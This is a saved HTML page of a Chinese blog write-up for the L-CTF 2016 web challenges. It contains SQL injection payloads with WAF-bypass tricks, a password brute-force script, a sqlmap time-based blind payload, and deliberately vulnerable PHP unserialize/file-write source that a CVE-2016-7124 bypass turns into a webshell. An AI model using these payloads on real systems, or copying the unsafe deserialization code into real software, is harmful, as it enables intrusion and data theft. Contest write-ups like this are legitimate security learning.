<!DOCTYPE html>

<html lang="zh-Hans">
<head>
<!--[if lt IE 9]>
        <style>body {display: none; background: none !important} </style>
        <meta http-equiv="Refresh" Content="0; url=//outdatedbrowser.com/" />
    <![endif]-->
<meta charset="utf-8"/>
<meta content="IE=edge, chrome=1" http-equiv="X-UA-Compatible">
<meta content="width=device-width, initial-scale=1, maximum-scale=1, user-scalable=no" name="viewport"/>
<meta content="telephone=no" name="format-detection">
<meta content="LoRexxar" name="author"/>
<meta content="在大家都为祖国母亲庆生的时候，天天都有人问我：你干嘛呢？出来玩呀….我表示(╯‵□′)╯︵┻━┻，稍微有点儿遗憾的是又刚好错过了小礼物的边缘线，做了2道高分web题还挺开心的o(^▽^)┛，不过xd的服务器也是蛮厉害…题题都要爆破还没怎么崩过…强无敌…" name="description"/>
<meta content="article" property="og:type"/>
<meta content="L-ctf2016 Writeup" property="og:title"/>
<meta content="http://lorexxar.cn/2016/10/03/Lctf2016/index.html" property="og:url"/>
<meta content="LoRexxar's Blog" property="og:site_name"/>
<meta content="在大家都为祖国母亲庆生的时候，天天都有人问我：你干嘛呢？出来玩呀….我表示(╯‵□′)╯︵┻━┻，稍微有点儿遗憾的是又刚好错过了小礼物的边缘线，做了2道高分web题还挺开心的o(^▽^)┛，不过xd的服务器也是蛮厉害…题题都要爆破还没怎么崩过…强无敌…" property="og:description"/>
<meta content="http://lorexxar.cn/img/lctf2016/paiming.png" property="og:image"/>
<meta content="http://lorexxar.cn/img/lctf2016/timu.png" property="og:image"/>
<meta content="http://lorexxar.cn/img/lctf2016/1.jpg" property="og:image"/>
<meta content="http://lorexxar.cn/img/lctf2016/2.png" property="og:image"/>
<meta content="2016-10-03T14:14:16.000Z" property="og:updated_time"/>
<meta content="summary" name="twitter:card"/>
<meta content="L-ctf2016 Writeup" name="twitter:title"/>
<meta content="在大家都为祖国母亲庆生的时候，天天都有人问我：你干嘛呢？出来玩呀….我表示(╯‵□′)╯︵┻━┻，稍微有点儿遗憾的是又刚好错过了小礼物的边缘线，做了2道高分web题还挺开心的o(^▽^)┛，不过xd的服务器也是蛮厉害…题题都要爆破还没怎么崩过…强无敌…" name="twitter:description"/>
<meta content="http://lorexxar.cn/img/lctf2016/paiming.png" name="twitter:image"/>
<link href="./L-ctf2016 Writeup  LoRexxar's Blog/apple-touch-icon.png" rel="apple-touch-icon"/>
<link href="./L-ctf2016 Writeup  LoRexxar's Blog/atom.xml" rel="alternate" title="LoRexxar's Blog" type="application/atom+xml"/>
<link href="./L-ctf2016 Writeup  LoRexxar's Blog/699-14040QPP9.jpg" rel="shortcut icon"/>
<link href="./L-ctf2016 Writeup  LoRexxar's Blog/jquery.fancybox.min.css" rel="stylesheet"/>
<script src="./L-ctf2016 Writeup  LoRexxar's Blog/pace.min.js"></script>
<link href="./L-ctf2016 Writeup  LoRexxar's Blog/pace-theme-minimal.css" rel="stylesheet"/>
<link href="./L-ctf2016 Writeup  LoRexxar's Blog/style.css" rel="stylesheet"/>
<link href="./L-ctf2016 Writeup  LoRexxar's Blog/font-awesome.min.css" rel="stylesheet"/>
<title>L-ctf2016 Writeup | LoRexxar's Blog</title>
<script src="./L-ctf2016 Writeup  LoRexxar's Blog/jquery.min.js"></script>
<script src="./L-ctf2016 Writeup  LoRexxar's Blog/clipboard.min.js"></script>
<script>
    var yiliaConfig = {
        fancybox: true,
        animate: false,
        isHome: false,
        isPost: true,
        isArchive: false,
        isTag: false,
        isCategory: false,
        fancybox_js: "//cdn.bootcss.com/fancybox/2.1.5/jquery.fancybox.min.js",
        scrollreveal: "//cdn.bootcss.com/scrollReveal.js/3.1.4/scrollreveal.min.js",
        search: true
    }
</script>
<script>
        yiliaConfig.jquery_ui = [true, "//cdn.bootcss.com/jqueryui/1.10.4/jquery-ui.min.js", "//cdn.bootcss.com/jqueryui/1.10.4/css/jquery-ui.min.css"];
    </script>
<script> yiliaConfig.rootUrl = "\/";</script>
<script>
        var _hmt = _hmt || [];
        (function() {
            var hm = document.createElement("script");
            hm.src = "//hm.baidu.com/hm.js?736cd32ff67d23a009e16622fd600527";
            var s = document.getElementsByTagName("script")[0]; 
            s.parentNode.insertBefore(hm, s);
        })();
    </script>
</meta></meta></head>
<body>
<div id="container">
<div class="left-col">
<div class="overlay"></div>
<div class="intrude-less">
<header class="inner" id="header">
<a class="profilepic" href="/">
<img class="animated zoomIn" src="./L-ctf2016 Writeup  LoRexxar's Blog/699-14040QPP9.jpg"/>
</a>
<hgroup>
<h1 class="header-author"><a href="/">LoRexxar</a></h1>
</hgroup>
<p class="header-subtitle">带着对技术的敬畏之心成长，不安于一隅...</p>
<form id="search-form">
<input autocomplete="off" autocorrect="off" class="search form-control" id="local-search-input" name="q" placeholder="search..." searchonload="false" type="text"/>
<i class="fa fa-times" onclick="resetSearch()"></i>
</form>
<div id="local-search-result"></div>
<p class="no-result">No results found <i class="fa fa-spinner fa-pulse"></i></p>
<div class="switch-btn" id="switch-btn">
<div class="icon">
<div class="icon-ctn">
<div class="icon-wrap icon-house" data-idx="0">
<div class="birdhouse"></div>
<div class="birdhouse_holes"></div>
</div>
<div class="icon-wrap icon-ribbon hide" data-idx="1">
<div class="ribbon"></div>
</div>
<div class="icon-wrap icon-link hide" data-idx="2">
<div class="loopback_l"></div>
<div class="loopback_r"></div>
</div>
<div class="icon-wrap icon-me hide" data-idx="3">
<div class="user"></div>
<div class="shoulder"></div>
</div>
</div>
</div>
<div class="tips-box hide">
<div class="tips-arrow"></div>
<ul class="tips-inner">
<li>菜单</li>
<li>标签</li>
<li>友情链接</li>
<li>关于我</li>
</ul>
</div>
</div>
<div class="switch-area" id="switch-area">
<div class="switch-wrap">
<section class="switch-part switch-part1">
<nav class="header-menu">
<ul>
<li><a href="/">主页</a></li>
<li><a href="/archives/">所有文章</a></li>
<li><a href="/tags/">标签云</a></li>
<li><a href="/about/">关于我</a></li>
</ul>
</nav>
<nav class="header-nav">
<ul class="social">
<a class="fa Email" href="/lorexxar@gmail.com" title="Email"></a>
<a class="fa 新浪微博" href="/强行被换号的LoRexxar" title="新浪微博"></a>
<a class="fa GitHub" href="https://github.com/LoRexxar" title="GitHub"></a>
<a class="fa RSS" href="/atom.xml" title="RSS"></a>
<a class="fa 知乎" href="https://www.zhihu.com/people/romor-rexxar" title="知乎"></a>
</ul>
</nav>
</section>
<section class="switch-part switch-part2">
<div class="widget tagcloud" id="js-tagcloud">
<ul class="tag-list"><li class="tag-list-item"><a class="tag-list-link" href="/tags/0day/">0day</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/Blogs/">Blogs</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/CBC/">CBC</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/Essay/">Essay</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/Essry/">Essry</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/Hexo/">Hexo</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/IPC通道入侵/">IPC通道入侵</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/LD-PRELOAD/">LD_PRELOAD</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/LFI/">LFI</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/RSA/">RSA</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/Reprint/">Reprint</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/Shadow-Brokers/">Shadow Brokers</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/access/">access</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/book-notes/">book_notes</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/bookshelf/">bookshelf</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/c/">c</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/cloudeye/">cloudeye</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/cmd/">cmd</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/crontab/">crontab</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/crypto/">crypto</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/csp/">csp</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/csrf/">csrf</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/ctf/">ctf</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/curl/">curl</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/cve/">cve</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/dns/">dns</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/docker/">docker</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/eassy/">eassy</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/fastcgi/">fastcgi</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/fcgi/">fcgi</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/file-put-contents/">file_put_contents</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/flask/">flask</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/game/">game</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/git/">git</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/gopher/">gopher</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/hctf/">hctf</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/injection/">injection</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/lcx端口转发/">lcx端口转发</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/lfi/">lfi</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/linux/">linux</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/misc/">misc</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/msf/">msf</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/opcache/">opcache</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/pdflatex/">pdflatex</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/php/">php</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/php-opcache/">php opcache</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/phpmailer/">phpmailer</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/php伪协议/">php伪协议</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/pwn/">pwn</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/pwnhub/">pwnhub</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/python/">python</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/rabins/">rabins</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/redis/">redis</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/sangebaimao/">sangebaimao</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/shell/">shell</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/sqli/">sqli</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/sqlmap/">sqlmap</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/ssh-sock5/">ssh_sock5</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/ssrf/">ssrf</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/titan-souls/">titan_souls</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/tqdm/">tqdm</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/virtualenv/">virtualenv</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/weblogic/">weblogic</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/wget/">wget</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/win-server信息收集/">win server信息收集</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/windows/">windows</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/xss/">xss</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/伪协议/">伪协议</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/参数污染/">参数污染</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/格式化字符串/">格式化字符串</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/模板注入/">模板注入</a></li></ul>
</div>
</section>
<section class="switch-part switch-part3">
<div id="js-friends">
<a class="main-nav-link switch-friends-link" href="https://coding.net/u/LoRexxar">Coding</a>
<a class="main-nav-link switch-friends-link" href="https://github.com/LoRexxar">GitHub</a>
<a class="main-nav-link switch-friends-link" href="http://hduisa.cn">HDUISA</a>
<a class="main-nav-link switch-friends-link" href="https://wiki.hduisa.cn">HDUISA_wiki</a>
<a class="main-nav-link switch-friends-link" href="https://lightless.me/">lightless</a>
<a class="main-nav-link switch-friends-link" href="http://lazysheep.cc">Hcamael</a>
<a class="main-nav-link switch-friends-link" href="http://aklis.info/">Aklis</a>
<a class="main-nav-link switch-friends-link" href="http://libc.pw/">zh_explorer</a>
<a class="main-nav-link switch-friends-link" href="http://edwardl.xyz/">Edward_L</a>
<a class="main-nav-link switch-friends-link" href="http://evilddog.space/">evilddog</a>
<a class="main-nav-link switch-friends-link" href="http://www.venenof.com/">Veneno</a>
<a class="main-nav-link switch-friends-link" href="http://www.nohackair.net/">Airbasic</a>
<a class="main-nav-link switch-friends-link" href="https://loli.be/">Mashiro</a>
<a class="main-nav-link switch-friends-link" href="http://www.codersec.net/">bsmali4</a>
<a class="main-nav-link switch-friends-link" href="/www.bertramc.cn">berTrAM</a>
</div>
</section>
<section class="switch-part switch-part4">
<div id="js-aboutme">带着对技术的敬畏之心成长，不安于一隅...</div>
</section>
</div>
</div>
</header>
</div>
</div>
<div class="mid-col">
<nav id="mobile-nav">
<div class="overlay">
<div class="slider-trigger"></div>
<h1 class="header-author js-mobile-header hide"><a href="/" title="回到主页">LoRexxar</a></h1>
</div>
<div class="intrude-less">
<header class="inner" id="header">
<a class="profilepic" href="/">
<img class="animated zoomIn" src="./L-ctf2016 Writeup  LoRexxar's Blog/699-14040QPP9.jpg"/>
</a>
<hgroup>
<h1 class="header-author"><a href="/" title="回到主页">LoRexxar</a></h1>
</hgroup>
<p class="header-subtitle">带着对技术的敬畏之心成长，不安于一隅...</p>
<nav class="header-menu">
<ul>
<li><a href="/">主页</a></li>
<li><a href="/archives/">所有文章</a></li>
<li><a href="/tags/">标签云</a></li>
<li><a href="/about/">关于我</a></li>
<div class="clearfix"></div>
</ul>
</nav>
<nav class="header-nav">
<ul class="social">
<a class="fa Email" href="/lorexxar@gmail.com" target="_blank" title="Email"></a>
<a class="fa 新浪微博" href="/强行被换号的LoRexxar" target="_blank" title="新浪微博"></a>
<a class="fa GitHub" href="https://github.com/LoRexxar" target="_blank" title="GitHub"></a>
<a class="fa RSS" href="/atom.xml" target="_blank" title="RSS"></a>
<a class="fa 知乎" href="https://www.zhihu.com/people/romor-rexxar" target="_blank" title="知乎"></a>
</ul>
</nav>
</header>
</div>
<link about="关于我" class="menu-list" friends="友情链接" tags="标签">
</link></nav>
<div class="body-wrap"><article class="article article-type-post" id="post-Lctf2016" itemprop="blogPost" itemscope="">
<div class="article-meta">
<a class="article-date" href="/2016/10/03/Lctf2016/">
<time datetime="2016-10-03T05:35:28.000Z" itemprop="datePublished">2016-10-03</time>
</a>
</div>
<div class="article-inner">
<input class="isFancy" type="hidden"/>
<header class="article-header">
<h1 class="article-title" itemprop="name">
      L-ctf2016 Writeup
    </h1>
</header>
<div class="article-info article-info-post">
<div class="article-category tagcloud">
<a class="article-category-link" href="/categories/Blogs/">Blogs</a>
</div>
<div class="article-tag tagcloud">
<ul class="article-tag-list"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/Blogs/">Blogs</a></li><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/ctf/">ctf</a></li></ul>
</div>
<div class="clearfix"></div>
</div>
<div class="article-entry" itemprop="articleBody">
<p>在大家都为祖国母亲庆生的时候，天天都有人问我：你干嘛呢？出来玩呀….我表示(╯‵□′)╯︵┻━┻，稍微有点儿遗憾的是又刚好错过了小礼物的边缘线，做了2道高分web题还挺开心的o(<em>^▽^</em>)┛，不过xd的服务器也是蛮厉害…题题都要爆破还没怎么崩过…强无敌…</p>
<p><img alt="" src="./L-ctf2016 Writeup  LoRexxar's Blog/paiming.png"/><br/><img alt="" src="./L-ctf2016 Writeup  LoRexxar's Blog/timu.png"/></p>
<a id="more"></a>
<h1 id="WEB"><a class="headerlink" href="#WEB" title="WEB"></a>WEB</h1><h2 id="web1-Can-you-get-the-flag"><a class="headerlink" href="#web1-Can-you-get-the-flag" title="web1 Can you get the flag"></a>web1 Can you get the flag</h2><p>稍微研究下，发现是注入</p>
<figure class="highlight gauss"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">Password ：' oorr (seleselectct<span class="comment">/**/</span> <span class="built_in">sleep</span>(<span class="number">100</span>))<span class="meta">#</span></div></pre></td></tr></table></figure>
<p>显错注入</p>
<figure class="highlight openscad"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">payload: '<span class="comment">/**/</span>anandd<span class="comment">/**/</span>updaupdatexmltexml(<span class="number">0</span>,<span class="built_in">concat</span>(<span class="number">0</span>x27,(seleselectct<span class="comment">/**/</span><span class="built_in">version</span>())),<span class="number">0</span>)%<span class="number">23</span></div></pre></td></tr></table></figure>
<p>注入得到了账号和密码</p>
<figure class="highlight coq"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">admin</div><div class="line">we1c0me%<span class="keyword">_</span>#<span class="number">2</span>&amp;<span class="keyword">_</span>@LCTF</div></pre></td></tr></table></figure>
<p>登陆上去发现并没有结束，但是发现如果flag为负的，那么会提示password wrong，那么就跑吧</p>
<figure class="highlight stylus"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div></pre></td><td class="code"><pre><div class="line">Python跑</div><div class="line">import requests</div><div class="line">flag=<span class="number">0</span></div><div class="line"><span class="keyword">for</span> pwd <span class="keyword">in</span> xrange(<span class="number">0</span>,<span class="number">9999</span>):</div><div class="line">    a=str(pwd)</div><div class="line">    b=<span class="selector-tag">a</span>.zfill(<span class="number">4</span>)</div><div class="line">    r=requests.post(</div><div class="line">   			 <span class="string">'http://web.l-ctf.com:6699/ret.php'</span>,</div><div class="line">   			 data={<span class="string">'selectNum'</span>: <span class="string">'-1'</span>, <span class="string">'passwd'</span>: <span class="selector-tag">b</span> , <span class="string">'submit'</span>: <span class="string">'Buy+It'</span> },</div><div class="line">   			 )</div><div class="line">    response = unicode(r<span class="selector-class">.content</span>, <span class="string">'utf-8'</span>)</div><div class="line">    <span class="keyword">if</span> <span class="string">'password wrong'</span> not <span class="keyword">in</span> response:</div><div class="line">   	 flag=<span class="number">1</span></div><div class="line">   	 print <span class="string">'password is'</span>,<span class="selector-tag">b</span>,response</div><div class="line">   	 break</div><div class="line">    elif(flag==<span class="number">0</span>):</div><div class="line">   	 print <span class="string">'trying'</span>,<span class="selector-tag">b</span></div><div class="line">    <span class="keyword">else</span>:</div><div class="line">   	 break</div></pre></td></tr></table></figure>
<p>得到密码<br/>5487</p>
<figure class="highlight coffeescript"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">flag <span class="keyword">is</span> here: LCTF{Th1nks_@f0r_<span class="comment">#your_%supp0rt}</span></div></pre></td></tr></table></figure>
<h2 id="我控几不主我及几啦"><a class="headerlink" href="#我控几不主我及几啦" title="我控几不主我及几啦"></a>我控几不主我及几啦</h2><p>说实话，开始翻了翻感觉waf太绝了….什么都有过滤，简直没法注，看到那么多人都做出来了，目测是sqlmap，跑一跑还真的注到了</p>
<figure class="highlight asciidoc"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div></pre></td><td class="code"><pre><div class="line">Database: xdctfweb150</div><div class="line">Table: articles</div><div class="line"><span class="meta">[4 columns]</span></div><div class="line"><span class="code">+---------+</span>-------------+</div><div class="line"><span class="section">| Column  | Type    	|</span></div><div class="line">+---------+-------------+</div><div class="line">| auther   | varchar(20) |</div><div class="line">| content | text    	|</div><div class="line">| id  	   | int(2)  	|</div><div class="line"><span class="section">| title        | varchar(50) |</span></div><div class="line">+---------+-------------+</div><div class="line"></div><div class="line">Database: xdctfweb150</div><div class="line">Table: where</div><div class="line"><span class="meta">[1 column]</span></div><div class="line"><span class="code">+--------+</span>-------------+</div><div class="line"><span class="section">| Column | Type    	|</span></div><div class="line">+--------+-------------+</div><div class="line"><span class="section">| secret | varchar(80) |</span></div><div class="line">+--------+-------------+</div><div class="line">Database: xdctfweb150</div><div class="line">Table: where</div><div class="line"><span class="meta">[1 entry]</span></div><div class="line"><span class="code">+--------------------------------+</span></div><div class="line"><span class="section">| secret                     	|</span></div><div class="line">+--------------------------------+</div><div class="line"><span class="section">| LCTF{H0w_D0_You_Bypass_My_w4f} |</span></div><div class="line">+--------------------------------+</div></pre></td></tr></table></figure>
<p>不知道做出来的那么多人有多少是知道怎么回事的。</p>
<p>事实上，那个被waf拦截的返回是在查询之后的，所以即便他waf拦截了返回，我们仍然可以用时间盲注来跑数据，sqlmap跑一会儿就出来了</p>
<p>payload:<br/><figure class="highlight apache"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line"><span class="attribute">http</span>://web.l-ctf.com:6699/LCTF150/?id=3<span class="number">%20</span>AND<span class="number">%202362</span><span class="number">%3</span>DIF<span class="number">%28</span><span class="number">%28</span>ORD<span class="number">%28</span>MID<span class="number">%28</span><span class="number">%28</span>SELECT<span class="number">%20</span>IFNULL<span class="number">%28</span>CAST<span class="number">%28</span>table_name<span class="number">%20</span>AS<span class="number">%20</span>CHAR<span class="number">%29</span><span class="number">%2</span>C0x20<span class="number">%29</span><span class="number">%20</span>FROM<span class="number">%20</span>INFORMATION_SCHEMA.TABLES<span class="number">%20</span>WHERE<span class="number">%20</span>table_schema<span class="number">%3</span>D0x7864637466776562313530<span class="number">%20</span>LIMIT<span class="number">%200</span><span class="number">%2</span>C1<span class="number">%29</span><span class="number">%2</span>C3<span class="number">%2</span>C1<span class="number">%29</span><span class="number">%29</span><span class="number">%3</span>E54<span class="number">%29</span><span class="number">%2</span>CSLEEP<span class="number">%283</span><span class="number">%29</span><span class="number">%2</span>C2362<span class="number">%29</span></div></pre></td></tr></table></figure></p>
<h2 id="睡过了"><a class="headerlink" href="#睡过了" title="睡过了"></a>睡过了</h2><p>开始一直没搞明白为啥是这样，怎么改都没用，后来队友有了思路，题目是CVE-2016-7124改的，前两天还挺有名的一个洞，因为360的文章是曲解，所以我影响还挺深的。</p>
<p>具体分析贴个队友的博客吧<br/><a href="http://lazysheep.cc/2016/09/13/0x22/" rel="external" target="_blank">http://lazysheep.cc/2016/09/13/0x22/</a></p>
<p>实话说不知道怎么解释，贴上getshell后拿到的源码吧</p>
<p>index.php<br/><figure class="highlight xml"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div></pre></td><td class="code"><pre><div class="line"><span class="tag">&lt;<span class="name">h1</span>&gt;</span>这是一个后门(不过好像不能直接用啊......<span class="tag">&lt;/<span class="name">h1</span>&gt;</span></div><div class="line"><span class="tag">&lt;<span class="name">hr</span> /&gt;</span></div><div class="line"><span class="tag">&lt;<span class="name">form</span> <span class="attr">action</span>=<span class="string">""</span> <span class="attr">method</span>=<span class="string">'POST'</span>&gt;</span></div><div class="line">Filename:<span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">'text'</span> <span class="attr">name</span>=<span class="string">'filename'</span> /&gt;</span><span class="tag">&lt;<span class="name">br</span>/&gt;</span></div><div class="line">Filedata:<span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">'text'</span> <span class="attr">name</span>=<span class="string">'filedata'</span> /&gt;</span><span class="tag">&lt;<span class="name">br</span>/&gt;</span></div><div class="line"><span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">"submit"</span> <span class="attr">name</span>=<span class="string">'submit'</span> /&gt;</span></div><div class="line"><span class="tag">&lt;/<span class="name">form</span>&gt;</span></div><div class="line"></div><div class="line"><span class="php"><span class="meta">&lt;?php</span></span></div><div class="line"><span class="class"><span class="keyword">class</span> <span class="title">key</span></span>{}</div><div class="line"><span class="keyword">if</span>($_POST[<span class="string">'filename'</span>] &amp;&amp; $_POST[<span class="string">'filedata'</span>]){</div><div class="line">	$key=<span class="keyword">new</span> key();</div><div class="line">	$key-&gt;filename=$_POST[<span class="string">'filename'</span>];</div><div class="line">	$key-&gt;filedata=$_POST[<span class="string">'filedata'</span>];	</div><div class="line">	$s=serialize($key);</div><div class="line"></div><div class="line">	<span class="keyword">echo</span> <span class="string">"&lt;meta http-equiv='refresh' content='0.1;url=upload.php?key="</span>.$s.<span class="string">"'&gt;"</span>;</div><div class="line">}</div><div class="line"><span class="meta">?&gt;</span></div></pre></td></tr></table></figure></p>
<p>这里就是一个简单的序列化过程</p>
<figure class="highlight xml"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div></pre></td><td class="code"><pre><div class="line"><span class="php"><span class="meta">&lt;?php</span></span></div><div class="line"><span class="class"><span class="keyword">class</span> <span class="title">key</span></span>{</div><div class="line">	<span class="keyword">var</span> $filename;</div><div class="line">	<span class="keyword">var</span> $filedata;</div><div class="line"></div><div class="line">	<span class="function"><span class="keyword">function</span> <span class="title">__wakeup</span><span class="params">()</span></span>{</div><div class="line">		<span class="keyword">echo</span> <span class="string">"Waking up.........&lt;br/&gt;"</span>;</div><div class="line">		<span class="keyword">foreach</span>(get_object_vars(<span class="keyword">$this</span>) <span class="keyword">as</span> $key=&gt;$value){</div><div class="line">			<span class="keyword">$this</span>-&gt;$key = <span class="keyword">null</span>;</div><div class="line">			<span class="keyword">echo</span> $key.<span class="string">" =&gt; "</span>.<span class="keyword">$this</span>-&gt;$key;</div><div class="line">			<span class="keyword">echo</span> <span class="string">"&lt;br /&gt;"</span>;</div><div class="line">		}</div><div class="line">		<span class="keyword">echo</span> <span class="string">"Finished&lt;br/&gt;"</span>;</div><div class="line">		<span class="keyword">echo</span> <span class="string">"&lt;br/&gt;"</span>;</div><div class="line">	}</div><div class="line"></div><div class="line">	<span class="function"><span class="keyword">function</span> <span class="title">__destruct</span><span class="params">()</span></span>{</div><div class="line">		<span class="comment">//Do something</span></div><div class="line">		<span class="keyword">$this</span>-&gt;my_file_put_contents(<span class="keyword">$this</span>-&gt;filename,<span class="keyword">$this</span>-&gt;filedata);</div><div class="line"></div><div class="line">	}</div><div class="line">	<span class="function"><span class="keyword">function</span> <span class="title">my_file_put_contents</span><span class="params">($file_path,$data)</span></span>{</div><div class="line">		<span class="keyword">if</span>($file_path &amp;&amp; $data){</div><div class="line">			$rs=file_put_contents(<span class="string">'./upload/'</span>.md5(<span class="keyword">$this</span>-&gt;filename).<span class="string">'.php'</span>,<span class="keyword">$this</span>-&gt;filedata);</div><div class="line">			<span class="keyword">echo</span> $rs.<span class="string">" written"</span>;</div><div class="line">		}</div><div class="line">	}</div><div class="line">}</div><div class="line">$key=$_GET[<span class="string">'key'</span>];</div><div class="line">preg_match(<span class="string">'/O:\d+:/'</span>,$key,$match);</div><div class="line"></div><div class="line"><span class="keyword">if</span>($match){</div><div class="line">	<span class="keyword">exit</span>(<span class="string">"据说这种key加也行&lt;br/&gt;"</span>);</div><div class="line">}</div><div class="line">$Obj=unserialize($key);</div><div class="line"></div><div class="line"><span class="meta">?&gt;</span></div></pre></td></tr></table></figure>
